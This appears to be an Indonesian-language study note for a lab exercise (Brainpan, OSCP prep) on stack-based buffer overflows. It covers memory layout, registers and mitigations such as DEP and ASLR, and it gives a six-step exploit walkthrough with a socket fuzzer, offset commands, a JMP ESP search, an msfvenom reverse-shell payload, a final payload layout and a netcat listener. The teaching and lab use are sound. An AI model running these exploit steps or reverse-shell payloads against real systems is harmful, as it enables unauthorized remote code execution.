# 💣 Buffer Overflow (Stack-Based)

> [!summary] Ringkasan
> **Buffer overflow** terjadi saat program menulis data **melebihi ukuran buffer** yang disediakan, sehingga "tumpah" menimpa memori di sebelahnya. Pada **stack-based overflow**, data tumpahan menimpa **return address** (alamat yang dipakai CPU untuk kembali setelah fungsi selesai) — kalau kita kendalikan alamat itu, kita kendalikan **alur eksekusi** dan bisa menjalankan **shellcode** kita sendiri. Note ini adalah teori pendamping untuk latihan praktik di [[Lab — Brainpan (Setup)]].

**Bagian dari:** [[Red Team (MOC)]]
**Prasyarat:** [[Linux Dasar untuk Security]], [[Exploitation & Metasploit]]
**Praktik di:** [[Lab — Brainpan (Setup)]]

> [!note] Konteks OSCP 2024+
> Ujian OSCP versi baru **sudah tidak menguji buffer overflow**. Tapi BOF tetap **fondasi penting** untuk memahami cara kerja exploit, register CPU, dan memori — modal untuk topik lanjutan (ROP, format string, heap). Pelajari konsepnya, jangan dihafal.

---

## 🧠 Konsep Inti

### Memori sebuah proses (gambaran kasar)
Saat program jalan, memorinya dibagi beberapa wilayah:

```
Alamat TINGGI
┌────────────────────┐
│       Stack        │  ← tumbuh ke BAWAH (alamat mengecil)
│         ↓          │     variabel lokal, return address, argumen
├────────────────────┤
│         ↑          │
│       Heap         │  ← alokasi dinamis (malloc/new)
├────────────────────┤
│   BSS / Data       │  ← variabel global
├────────────────────┤
│      Text          │  ← kode program (instruksi)
└────────────────────┘
Alamat RENDAH
```

### Stack & register kunci
- **Stack** = struktur LIFO tempat menyimpan variabel lokal, argumen fungsi, dan **return address**. Stack **tumbuh ke alamat yang lebih kecil**.
- **ESP** (Stack Pointer) — menunjuk **puncak** stack saat ini.
- **EBP** (Base Pointer) — menunjuk **dasar** stack frame fungsi yang sedang aktif.
- **EIP** (Instruction Pointer) — menunjuk **instruksi berikutnya** yang akan dieksekusi. **Inilah target kita.**

> [!info] x86 (32-bit) vs x64 (64-bit)
> Note ini pakai register **32-bit** (`EIP`, `ESP`, `EBP`) karena paling sederhana untuk belajar dan dipakai mesin seperti Brainpan. Di 64-bit namanya `RIP`, `RSP`, `RBP` dan ada perbedaan (mis. alamat tak boleh mengandung byte null di banyak posisi, kontrol via `RIP` lebih rumit). Konsep dasarnya sama.

### Kenapa return address bisa ditimpa?
Saat fungsi dipanggil, stack frame-nya kira-kira begini (dari dasar ke puncak):

```
[ argumen fungsi      ]
[ return address      ]  ← alamat untuk "pulang" setelah fungsi selesai → dipakai isi EIP
[ saved EBP           ]
[ buffer lokal ...... ]  ← di sinilah input kita ditaruh
```

Buffer lokal berada **di bawah** (alamat lebih kecil) return address. Kalau kita isi buffer dengan data **lebih panjang** dari kapasitasnya, tulisan terus naik dan **menimpa saved EBP lalu return address**. Saat fungsi `ret`, CPU mengambil return address yang sudah kita kuasai → `EIP` jadi nilai pilihan kita.

---

## ⚙️ Cara Kerja / Praktik — 6 langkah eksploitasi klasik

Alur baku menyusun exploit stack BOF (mis. terhadap aplikasi di port 9999 seperti Brainpan):

### 1. Fuzzing — bikin program crash
Kirim input makin panjang sampai aplikasi mati (tanda buffer kebobolan).
```python
#!/usr/bin/env python3
import socket
buf = b"A" * 100
while True:
    try:
        s = socket.socket(); s.connect(("TARGET_IP", 9999))
        s.send(buf + b"\r\n"); s.close()
        print("dikirim:", len(buf)); buf += b"A" * 100
    except:
        print("crash sekitar:", len(buf)); break
```

### 2. Cari offset — di byte ke berapa EIP tertimpa?
Kirim pola unik, lalu lihat nilai apa yang masuk ke EIP saat crash.
```bash
# buat pola unik sepanjang ~crash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600
# setelah crash, ambil nilai EIP dari debugger, lalu:
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 600 -q 35724134
# output: "Exact match at offset 524"  → EIP mulai di byte ke-524
```

### 3. Kuasai EIP — buktikan kontrol
Kirim `524` byte junk + 4 byte penanda. Kalau EIP = `42424242` (="BBBB"), kontrol terbukti.
```python
payload = b"A"*524 + b"BBBB"
```

### 4. Cari bad characters
Beberapa byte "merusak" payload (mis. `\x00` null, `\x0a` newline, `\x0d` carriage return). Kirim semua byte `\x01..\xff`, bandingkan di memori, buang yang hilang/berubah.
```python
badchars = bytes(range(1,256))   # kirim, lalu inspeksi di debugger
# umum buruk: \x00 \x0a \x0d  → harus dihindari di shellcode & alamat
```

### 5. Cari alamat lompatan (JMP ESP)
ESP menunjuk ke awal shellcode kita. Cari instruksi `JMP ESP` di modul tanpa proteksi, pakai alamatnya untuk isi EIP.
```text
# di Immunity Debugger + mona.py (dijalankan di Windows analyzer):
!mona modules                 # cari modul tanpa ASLR/DEP/SafeSEH
!mona jmp -r esp -cpb "\x00\x0a\x0d"   # cari JMP ESP bebas bad chars
# mis. dapat 0x311712F3  → EIP diisi alamat ini (little-endian: \xf3\x12\x17\x31)
```

### 6. Generate shellcode & susun payload final
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=KALI_IP LPORT=4444 \
  -b "\x00\x0a\x0d" -f python    # -b = exclude bad chars
```
Susunan payload akhir:
```python
#        [ junk      ] [ EIP=JMP ESP   ] [ NOP sled ] [ shellcode ]
payload = b"A"*524   + b"\xf3\x12\x17\x31" + b"\x90"*16 + shellcode
```
- **NOP sled** (`\x90` = "no operation") = bantalan; kalau ESP meleset sedikit, CPU "meluncur" lewat NOP sampai ke shellcode.
- Jalankan listener `nc -lvnp 4444`, kirim payload → **reverse shell**.

> [!tip] Selalu kerja dengan snapshot & debugger
> BOF butuh banyak percobaan + restart layanan/VM. Ambil **snapshot bersih** dulu, dan jalankan target di bawah debugger agar bisa lihat register saat crash.

---

## 🛡️ Proteksi modern (kenapa BOF tak segampang ini lagi)

Eksploitasi di atas mengasumsikan target "polos". Sistem modern punya mitigasi:

| Proteksi | Apa yang dicegah | Cara dilewati (konsep) |
|---|---|---|
| **DEP / NX** (Non-Executable stack) | Eksekusi shellcode di stack | **[[ROP (Return-Oriented Programming)]]** — rangkai potongan kode yang sudah ada |
| **ASLR** | Alamat tetap (mis. JMP ESP) | Cari modul non-ASLR, **info leak** (mis. [[Format String Exploitation]]), atau brute (32-bit) |
| **Stack Canary / Stack Cookie** | Timpa return address tanpa ketahuan | Bocorkan/tebak canary, atau serang vektor lain |
| **SafeSEH / SEHOP** | Penyalahgunaan exception handler (SEH overflow) | Modul tanpa SafeSEH |

Inilah sebabnya BOF nyata di software modern jauh lebih sulit — tapi memahami versi dasar adalah pintu masuk ke teknik-teknik lanjutan itu.

---

## 🧰 Tools

- **Immunity Debugger / x32dbg / GDB+GEF** — amati register & memori saat crash.
- **mona.py** — plugin Immunity untuk otomasi (pattern, bad chars, JMP ESP, ROP chain).
- **pattern_create.rb / pattern_offset.rb** — cari offset EIP (Metasploit).
- **msfvenom** — generate shellcode bebas bad-char.
- **netcat (nc)** — listener reverse shell.
- **Python / socket** — skrip pengirim payload (fuzzer & exploit).

## 🔗 Kaitan

- Lanjutan praktis dari [[Exploitation & Metasploit]] (di sini kita susun exploit **manual**, bukan modul jadi).
- Latihan langsung: [[Lab — Brainpan (Setup)]] — mesin BOF klasik di vault.
- Setelah dapat shell → [[Privilege Escalation]] → [[Post-Exploitation & Pivoting]].
- **Sisi Blue ↔** mitigasi DEP/ASLR/canary masuk ranah [[Hardening & Vulnerability Management]]; shellcode/payload yang tertangkap dibedah di [[Malware Analysis Dasar]]; deteksi eksploitasi memori oleh [[Endpoint Security & EDR]].
- Relevan untuk pemahaman teknis di [[Reporting & Sertifikasi (OSCP-dll)]].

## 🎯 Latihan

- Selesaikan **[[Lab — Brainpan (Setup)|Brainpan]]** dari nol: fuzz → offset → kontrol EIP → bad chars → JMP ESP → shellcode → shell. Tulis tiap langkah + nilai (offset, alamat) sebagai write-up.
- **TryHackMe — "Buffer Overflow Prep" (room OVRFLW / Tib3rius)** — 10+ soal latihan dengan pola sama.
- Gambar ulang diagram stack frame-mu sendiri sampai paham kenapa byte ke-524 = EIP.

## 📖 Sumber

- **TryHackMe — Buffer Overflow Prep** — https://tryhackme.com/room/bufferoverflowprep
- **Corelan — Exploit writing tutorial part 1** (klasik, mendalam) — https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/
- **"Smashing The Stack For Fun And Profit"** (Aleph One, Phrack 49) — makalah legendaris asal-usul teknik ini.
- **OSCP-prep BOF guides** (TJnull/NetSecFocus) — walau OSCP 2024+ tak lagi menguji BOF.
